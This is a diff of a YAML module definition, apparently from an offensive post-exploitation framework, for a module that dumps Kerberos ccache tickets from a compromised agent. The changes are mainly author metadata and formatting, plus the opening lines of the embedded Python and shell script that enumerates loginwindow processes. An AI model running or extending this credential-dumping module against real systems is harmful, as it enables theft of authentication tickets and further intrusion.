@@ -1,8 +1,14 @@
 name: Dump Kerberos Tickets
 authors:
-  - '@424f424f,@gentilkiwi'
+  - name: ''
+    handle: '@424f424f'
+    link: https://twitter.com/424f424f
+  - name: Benjamin Delpy
+    handle: '@gentilkiwi'
+    link: https://twitter.com/gentilkiwi
 description: This module will dump ccache kerberostickets to the specified directory
 software: ''
+tactics: []
 techniques:
   - T1208
 background: false
@@ -18,7 +24,7 @@ options:
     description: Agent to grab a tickets from.
     required: true
     value: ''
-script: |
+script: |-
   import subprocess
   kerbdump = \"""
   ps auxwww |grep /loginwindow |grep -v "grep /loginwindow" |while read line
